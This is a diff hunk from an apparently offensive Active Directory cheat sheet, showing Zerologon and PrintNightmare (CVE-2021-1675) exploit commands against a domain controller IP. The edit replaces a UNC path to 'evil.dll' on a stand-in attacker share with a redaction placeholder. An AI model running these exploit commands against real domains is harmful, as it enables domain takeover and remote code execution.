@@ -291,7 +291,7 @@ python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpas
 rpcdump.py @10.10.10.10 | grep 'MS-RPRN'
 
 # Exploit (requires hosting malicious DLL)
-python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
+python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '[REDACTED_MALICIOUS_DLL_PAYLOAD]'
 ```
 
 ### samAccountName Spoofing (CVE-2021-42278/42287)
